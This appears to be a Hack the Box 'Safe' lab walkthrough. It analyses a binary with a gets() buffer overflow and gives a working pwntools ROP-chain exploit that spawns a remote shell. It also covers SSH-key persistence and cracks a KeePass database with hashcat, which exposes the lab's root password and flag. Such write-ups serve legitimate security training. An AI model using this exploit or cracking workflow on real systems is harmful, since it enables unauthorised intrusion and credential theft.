@@ -1,0 +1,504 @@
+SAFE - Hack the Box - Linux Easy
+
+Exploiting binary via ROP chains
+
+Open ports on 22 80 1337
+
+ssh, default apache page on port a 80, we get interesting output on port 1337 that we check on our web browser
+XINETD used to host service on port 1337.
+Commands and Output:
+===================================================================================================================================
+13:03:31 up 57 min,  0 users,  load average: 0.00, 0.00, 0.00
+
+What do you want me to echo back? GET / HTTP/1.1
+
+===================================================================================================================================
+
+Not much else is known, so we run a gobuster on the web page 
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/safe]
+└──╼ $gobuster dir -u http://10.10.10.147/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o web-root.out
+===================================================================================================================================
+
+While that is running in the background, we can take a look at web page source and we find something interesting.
+Commands and Output:
+===================================================================================================================================
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<!-- 'myapp' can be downloaded to analyze from here
+     its running on port 1337 -->
+===================================================================================================================================
+
+As we can see we can go to 10.10.10.147/myapp and we can download the file. We can wget.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/safe]
+└──╼ $wget 10.10.10.147/myapp
+--2021-04-14 10:37:10--  http://10.10.10.147/myapp
+Connecting to 10.10.10.147:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16592 (16K)
+Saving to: ‘myapp’
+
+myapp                              100%[==============================================================>]  16.20K  --.-KB/s    in 0.1s    
+
+2021-04-14 10:37:10 (167 KB/s) - ‘myapp’ saved [16592/16592]
+
+┌─[user@parrot-virtual]─[~/htb/safe]
+└──╼ $file myapp 
+myapp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fcbd5450d23673e92c8b716200762ca7d282c73a, not stripped
+===================================================================================================================================
+
+As you can see the myapp file is an executable file stored on the webserver. We can analyze the code with ghidra.
+We can also ncat to directly interact with port 1337
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/safe]
+└──╼ $ncat 10.10.10.147 1337
+ 14:04:03 up  1:58,  0 users,  load average: 0.00, 0.01, 0.00
+ls
+
+What do you want me to echo back? ls
+ls
+ls
+Ncat: Broken pipe.
+===================================================================================================================================
+
+We look at main function using ghidra and see the main code
+Commands and Output:
+===================================================================================================================================
+
+undefined8 main(void)
+
+{
+  char local_78 [112];
+  
+  system("/usr/bin/uptime");
+  printf("\nWhat do you want me to echo back? ");
+  gets(local_78);
+  puts(local_78);
+  return 0;
+}
+===================================================================================================================================
+
+By analying this right off the bat we can see that we can get a buffer overflow given that local variable name has only allocated
+112 bytes and gets and puts are both vulnerable functions.
+
+We also install gef as part gdb to debug the application and test the buffer overflow.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/safe]
+└──╼ $gdb ./myapp 
+GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
+Copyright (C) 2021 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+GEF for linux ready, type `gef' to start, `gef config' to configure
+92 commands loaded for GDB 10.1.90.20210103-git using Python engine 3.9
+Reading symbols from ./myapp...
+(No debugging symbols found in ./myapp)
+gef➤  r
+Starting program: /home/user/htb/safe/myapp 
+[Detaching after vfork from child process 6510]
+ 11:13:26 up  2:12,  1 user,  load average: 0.24, 0.23, 0.20
+
+What do you want me to echo back? 
+
+
+===================================================================================================================================
+
+we also create a string to test the input
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/safe]
+└──╼ $python -c 'print("A"*112)'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+===================================================================================================================================
+
+We now have to create a unique pattern to test from.
+Commands and Output:
+===================================================================================================================================
+gef➤  pattern_create 200
+Undefined command: "pattern_create".  Try "help".
+gef➤  pattern create 200
+[+] Generating a pattern of 200 bytes
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
+[+] Saved as '$_gef0'
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+gef➤  registers
+$rax   : 0x0               
+$rbx   : 0x0               
+$rcx   : 0x00007ffff7ed3f33  →  0x5577fffff0003d48 ("H="?)
+$rdx   : 0x0               
+$rsp   : 0x00007fffffffdf08  →  "paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava[...]"
+$rbp   : 0x616161616161616f ("oaaaaaaa"?)
+$rsi   : 0x00000000004052a0  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
+$rdi   : 0x00007ffff7fa6670  →  0x0000000000000000
+$rip   : 0x00000000004011ac  →  <main+77> ret 
+$r8    : 0xc9              
+$r9    : 0x0               
+$r10   : 0xfffffffffffff28e
+$r11   : 0x246             
+$r12   : 0x0000000000401070  →  <_start+0> xor ebp, ebp
+$r13   : 0x0               
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+gef➤  pattern search $rsp
+[+] Searching '$rsp'
+[+] Found at offset 120 (little-endian search) likely
+[+] Found at offset 113 (big-endian search) 
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/safe]
+└──╼ $python -c 'print("A"*120 + "B"*8 + "C"*8)'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+gef➤  registers
+$rax   : 0x0               
+$rbx   : 0x0               
+$rcx   : 0x00007ffff7ed3f33  →  0x5577fffff0003d48 ("H="?)
+$rdx   : 0x0               
+$rsp   : 0x00007fffffffdf08  →  "BBBBBBBBCCCCCCCC"
+$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
+$rsi   : 0x00000000004052a0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$rdi   : 0x00007ffff7fa6670  →  0x0000000000000000
+$rip   : 0x00000000004011ac  →  <main+77> ret 
+===================================================================================================================================
+
+Here is the code to send the payload with 
+Commands and Output:
+===================================================================================================================================
+# 0x40115f main
+from pwn import *
+context(terminal=['tmux', 'new-window'])
+p = gdb.debug('./myapp', 'b main')
+context(os='linux', arch='amd64')
+
+junk = ("A"*120).encode()
+call_main = p64(0x40115f)
+p.recvuntil("What do you want me to echo back?")
+p.sendline(junk + call_main)
+===================================================================================================================================
+
+We want to hijack the system call calling uptime. We don't have a way to put something on the stack. We will have to find a way.
+To exploit this is try to find a way to put our string inside rdi of rdi (/usr/bin/uptime)
+
+Commands and Output:
+===================================================================================================================================
+gef➤  x/s $rdi
+0x402008:       "/usr/bin/uptime"
+gef➤  registers
+$rax   : 0x000000000040115f  →  <main+0> push rbp
+$rbx   : 0x0               
+$rcx   : 0x00007f19540b4718  →  0x00007f19540b6b00  →  0x0000000000000000
+$rdx   : 0x00007fffd2c23a78  →  0x00007fffd2c252c8  →  "SHELL=/bin/bash"
+$rsp   : 0x00007fffd2c23900  →  0x0000000000000000
+$rbp   : 0x00007fffd2c23970  →  0x00000000004011b0  →  <__libc_csu_init+0> push r15
+$rsi   : 0x00007fffd2c23a68  →  0x00007fffd2c252c0  →  0x00707061796d2f2e ("./myapp"?)
+$rdi   : 0x0000000000402008  →  "/usr/bin/uptime"
+$rip   : 0x000000000040116e  →  <main+15> call 0x401040 <system@plt>
+$r8    : 0x0               
+$r9    : 0x00007f19540ed180  →  <_dl_fini+0> push rbp
+$r10   : 0x0               
+$r11   : 0x0               
+$r12   : 0x0000000000401070  →  <_start+0> xor ebp, ebp
+$r13   : 0x0               
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+
+===================================================================================================================================
+
+RSP contains the output of what things are called.
+
+Commands and Output:
+===================================================================================================================================
+undefined8 main(void)
+
+{
+  char most_likely_rsp [112];
+  
+  system("/usr/bin/uptime");
+  printf("\nWhat do you want me to echo back? ");
+  gets(most_likely_rsp);
+  puts(most_likely_rsp);
+  return 0;
+}
+===================================================================================================================================
+
+If we do a rop chain, we will push rsp into rdi and then jump to r13, r13 we want to be system
+Commands and Output:
+===================================================================================================================================
+gef➤  ropper --search "pop r13"
+[INFO] Load gadgets for section: LOAD
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop r13
+
+[INFO] File: /home/user/htb/safe/myapp
+0x0000000000401206: pop r13; pop r14; pop r15; ret; 
+===================================================================================================================================
+
+We will do null values on those other 2 pops. We ned to find the plt system to do that we do the following:
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/safe]
+└──╼ $objdump -D myapp | grep -i system
+0000000000401040 <system@plt>:
+  401040:	ff 25 da 2f 00 00    	jmpq   *0x2fda(%rip)        # 404020 <system@GLIBC_2.2.5>
+  40116e:	e8 cd fe ff ff       	callq  401040 <system@plt>
+===================================================================================================================================
+
+
+We also need the test function address since that calls the system
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/safe]
+└──╼ $objdump -D myapp | grep -i test
+  40100b:	48 85 c0             	test   %rax,%rax
+  4010c2:	48 85 c0             	test   %rax,%rax
+  401104:	48 85 c0             	test   %rax,%rax
+0000000000401152 <test>:
+===================================================================================================================================
+
+Final code:
+Commands and Output:
+===================================================================================================================================
+# 0x40115f main$    
+# 0x40116e - System$    
+# 0x401206 - Pop r13, pop, pop$    
+from pwn import *$    
+#context(terminal=['tmux', 'new-window'])$    
+#p = gdb.debug('./myapp', 'b main')$    
+p = remote('10.10.10.147', 1337)$    
+context(os='linux', arch='amd64')$    
+$    
+junk = ("A"*112).encode()$    
+# ROP chain$    
+bin_sh = "/bin/sh\x00".encode()  # 8 character bytes$    
+#plt_system = p64(0x401040)$    
+system = p64(0x401040)$    
+pop_r13 = p64(0x401206) # Later used as JMP r13, treat as rsp$    
+null = p64(0x0)$    
+test = p64(0x401152) # will call system, RSP > RDI, JMP r13$    
+$    
+call_main = p64(0x40115f)$    
+#p.recvuntil("What do you want me to echo back?")$    
+# bin sh registered as the rsp variable, first memory address overwrite into rsp,+$    
+# Test funtion is required in order for it to call all those previous instructions and have the program work correctly,$
+# if you look at the ghidra test function you will see the order of operations, it will pop pop the null values meanwhile return$
+# the system address while then pointing and executing the bin_sh program.$
+p.sendline(junk + bin_sh + pop_r13 + system + null + null + test)$    
+p.interactive()$    
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/safe]
+└──╼ $python3 exploit.py 
+[+] Opening connection to 10.10.10.147 on port 1337: Done
+[*] Switching to interactive mode
+ 17:33:10 up  5:27,  0 users,  load average: 0.00, 0.00, 0.00
+$ whoami
+user
+===================================================================================================================================
+
+
+Once we get in we can get persistence by creating a set of private and public keys on our server. Then we can append our safe public
+to the remote victims .ssh/authorized_keys file and just ssh speicfying our own private key we previously generated.
+
+We also find a bunch of jpgs and key pass database file, we want to crack so we will convert it to john format
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/safe]
+└──╼ $locate *2john
+/usr/bin/bitlocker2john
+/usr/bin/dmg2john
+/usr/bin/gpg2john
+/usr/bin/hccap2john
+/usr/bin/keepass2john
+/usr/bin/putty2john
+/usr/bin/racf2john
+/usr/bin/rar2john
+/usr/bin/uaf2john
+/usr/bin/vncpcap2john
+/usr/bin/wlanhcx2john
+/usr/bin/wpapcap2john
+/usr/bin/zip2john
+===================================================================================================================================
+
+
+Now that we have generated the hash we will do the same for the jpegs by using the keypass database file as the key
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/safe/files]
+└──╼ $/usr/bin/keepass2john MyPasswords.kdbx >>keypass_hashes
+┌─[user@parrot-virtual]─[~/htb/safe/files]
+└──╼ $cat keypass_hashes 
+MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96
+┌─[user@parrot-virtual]─[~/htb/safe/files]
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/safe/files]
+└──╼ $keepass2john -k IMG_0547.JPG MyPasswords.kdbx > single_hash
+┌─[user@parrot-virtual]─[~/htb/safe/files]
+└──╼ $cat single_hash 
+MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*e949722c426b3604b5f2c9c2068c46540a5a2a1c557e66766bab5881f36d93c7
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/safe/files]
+└──╼ $hashcat -m 13400 --force --user -O single_hash /usr/share/wordlists/rockyou.txt
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/safe/files]
+└──╼ $hashcat -m 13400 --force --user -O single_hash /usr/share/wordlists/rockyou.txt --show
+MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*e949722c426b3604b5f2c9c2068c46540a5a2a1c557e66766bab5881f36d93c7:bullshit
+===================================================================================================================================
+
+We found the password from one of the files. Nex we install the keypass commandline tool
+Commands and Output:
+===================================================================================================================================
+sudo apt install kpcli
+┌─[✗]─[user@parrot-virtual]─[~/htb/safe/files]
+└──╼ $kpcli --kdb MyPasswords.kdbx --key IMG_0547.JPG 
+Please provide the master password: *************************
+
+KeePass CLI (kpcli) v3.1 is ready for operation.
+Type 'help' for a description of available commands.
+Type 'help <command>' for details on individual commands.
+
+kpcli:/> help
+  attach -- Manage attachments: attach <path to entry|entry number>
+      cd -- Change directory (path to a group)
+      cl -- Change directory and list entries (cd+ls)
+   clone -- Clone an entry: clone <path to entry> <path to new entry>
+   close -- Close the currently opened database
+     cls -- Clear screen ("clear" command also works)
+    copy -- Copy an entry: copy <path to entry> <path to new entry>
+    edit -- Edit an entry: edit <path to entry|entry number>
+  export -- Export entries to a new KeePass DB (export <file.kdb> [<file.key>])
+    find -- Finds entries by Title
+    help -- Print helpful information
+ history -- Prints the command history
+   icons -- Change group or entry icons in the database
+  import -- Import a password database (import <file> <path> [<file.key>])
+      ls -- Lists items in the pwd or specified paths ("dir" also works)
+   mkdir -- Create a new group (mkdir <group_name>)
+      mv -- Move an item: mv <path to a group|or entries> <path to group>
+     new -- Create a new entry: new <optional path&|title>
+    open -- Open a KeePass database file (open <file.kdb> [<file.key>])
+   purge -- Purges entries in a given group base on criteria.
+    pwck -- Check password quality: pwck <entry|group>
+     pwd -- Print the current working directory
+    quit -- Quit this program (EOF and exit also work)
+  rename -- Rename a group: rename <path to group>
+      rm -- Remove an entry: rm <path to entry|entry number>
+   rmdir -- Delete a group (rmdir <group_name>)
+    save -- Save the database to disk
+  saveas -- Save to a specific filename (saveas <file.kdb> [<file.key>])
+    show -- Show an entry: show [-f] [-a] <entry path|entry number>
+   stats -- Prints statistics about the open KeePass file
+     ver -- Print the version of this program
+    vers -- Same as "ver -v"
+      xp -- Copy password to clipboard: xp <entry path|number>
+      xu -- Copy username to clipboard: xu <entry path|number>
+      xw -- Copy URL (www) to clipboard: xw <entry path|number>
+      xx -- Clear the clipboard: xx
+
+Type "help <command>" for more detailed help on a command.
+kpcli:/> ls
+=== Groups ===
+MyPasswords/
+kpcli:/> cd MyPasswords/
+kpcli:/MyPasswords> ls
+=== Groups ===
+eMail/
+General/
+Homebanking/
+Internet/
+Network/
+Recycle Bin/
+Windows/
+=== Entries ===
+0. Root password                                                          
+kpcli:/MyPasswords> show -f Root\ password 
+
+ Path: /MyPasswords/
+Title: Root password
+Uname: root
+ Pass: u3v2249dl9ptv465cogl3cnpo3fyhk
+  URL: 
+Notes: 
+
+kpcli:/MyPasswords> 
+===================================================================================================================================
+
+Once we entered the master password we now have access to the root password of the machine, we navigate the directories and 
+come up with "u3v2249dl9ptv465cogl3cnpo3fyhk" as the password, we can't ssh but we can do it inside the user shell and get root.
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/safe/ssh]
+└──╼ $ssh -i safe user@10.10.10.147
+Linux safe 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1 (2019-04-12) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Apr 14 17:48:01 2021 from 10.10.14.23
+user@safe:~$ 
+user@safe:~$ su -
+Password: 
+su: Authentication failure
+user@safe:~$ su -
+Password: 
+su: Authentication failure
+user@safe:~$ su -
+Password: 
+root@safe:~# ls
+root.txt
+root@safe:~# cat root.txt 
+d7af235eb1db9fa059d2b99a6d1d5453
+root@safe:~# 
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
